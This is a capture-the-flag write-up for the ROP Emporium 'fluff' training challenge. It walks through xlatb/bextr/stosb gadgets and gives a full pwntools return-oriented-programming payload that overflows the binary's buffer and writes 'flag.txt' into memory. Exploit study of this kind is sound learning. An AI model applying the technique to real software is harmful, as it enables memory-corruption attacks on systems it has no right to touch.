# ROP Emporium: Fluff

## Problem Description

> There's not much more to this challenge, we just have to think about ways to move data into the registers we want to control. Sometimes we'll need to take an indirect approach, especially in smaller binaries with fewer available gadgets like this one. If you're using a gadget finder like ropper, you may need to tell it to search for longer gadgets. As usual, you'll need to call the `print_file()` function with a path to the flag as its only argument. Some useful(?) gadgets are available at the `questionableGadgets` symbol.

---

## Objective

Call `print_file()` with a pointer to the string `'flag.txt'` stored in memory. The difficulty arises because we aren't given a `mov` gadget to directly write strings into memory.

## Given Gadgets

The `questionableGadgets` section provides the following:

```nasm
0x00400628      xlatb
0x00400629      ret
0x0040062a      pop     rdx
0x0040062b      pop     rcx
0x0040062c      add     rcx, 0x3ef2
0x00400633      bextr   rbx, rcx, rdx
0x00400638      ret
0x00400639      stosb   byte [rdi], al
0x0040063a      ret
0x0040063b      nop     dword [rax + rax]
```

### Gadget 1: `xlatb; ret`

```
al = [rbx + al]
```

### Gadget 2: `pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx`

```
bextr rbx, rcx, rdx
```

- **bextr syntax**: `bextr destination, source, control`
- **rdx (control)**: bits[7:0] = start bit, bits[15:8] = length
- `rdx = 0x0804` ⇒ starting at bit 4, take 8 bits ⇒ Not useful for full 64-bit write
- Instead, use `rdx = 0x4000` ⇒ start = 0, length = 64 bits

### Gadget 3: `stosb; ret`

```
[rdi] = al
```

---

## Strategy

1. **Find Addresses of Characters**

We use the following script to find addresses of ASCII characters in the binary:

```python
import os

str = 'flag.txt'

for c in str:
    hexcode = hex(ord(c)).strip('0x')
    os.system("ROPgadget --binary fluff --opcode "+hexcode+" | tail -n1")
```

(Credit to [b4nng](https://b4nng.github.io/) for the idea.)

2. **Calculate Values**

For each character `c`, get the address of `c` in the binary. Then:

- Calculate `rbx = addr - al`
- Subtract `offset = 0x3ef2` because the gadget adds it to `rcx`
- Use `bextr` to move the calculated address into `rbx`
- `xlatb` will load the target char into `al`
- Store `al` to `[rdi]` using `stosb`

3. **Write the string to **``

Repeat step 2 for each character of `'flag.txt'`, updating `rdi` accordingly.

4. **Call **``

After writing the full string, pop the address of `.bss` into `rdi` and call `print_file()`.

---

## Debugging Tips

Use `pwndbg` to monitor `.bss` and register values:

```python
gdb.attach(p, gdbscript="""
b *0x0040062a  # bextr
b *0x400510    # print_file
c
""")
```

Use `x/32x *<addr of .bss>` to view `.bss` contents.

Initial `al` value = `0xb` (found via pwndbg).

---

## Final Payload

```python
from pwn import *

p = process('./fluff')

junk = b'A'*40

print_file = p64(0x00400510)
bss_addr = 0x00601038

pop_rdi = p64(0x00000000004006a3)  # pop rdi ; ret
xlat = p64(0x0000000000400628)     # xlatb ; ret
stosb = p64(0x0000000000400639)    # stosb byte ptr [rdi], al ; ret
pop_rdx_rcx_bextr = p64(0x0040062a) # rcx + 0x3ef2

offset = 0x3ef2

char_addrs = {
    'f': p64(0x004006a6),
    'l': p64(0x00400405),
    'a': p64(0x004005d2),
    'g': p64(0x004007a0),
    '.': p64(0x004006a7),
    't': p64(0x004006ce),
    'x': p64(0x004007bc)
}

flag_txt = ['f', 'l', 'a', 'g', '.', 't', 'x', 't']

rdx_val = 0x4000  # start=0, length=64
al = 0xb          # initial value of al

payload = junk
payload += pop_rdi
payload += p64(bss_addr)

for c in flag_txt:
    addr = u64(char_addrs[c])
    rbx_val = addr - al

    payload += pop_rdx_rcx_bextr
    payload += p64(rdx_val)
    payload += p64(rbx_val - offset)
    payload += xlat
    payload += stosb

    al = ord(c)

payload += pop_rdi
payload += p64(bss_addr)
payload += print_file

p.sendline(payload)
p.interactive()
```

---

## Conclusion

This challenge was a lot of fun. I actually learned some new instructions and had to really bend assembly logic to write into memory without using `mov`. Really enjoyed this one, and I’m looking forward to the next challenge even more!

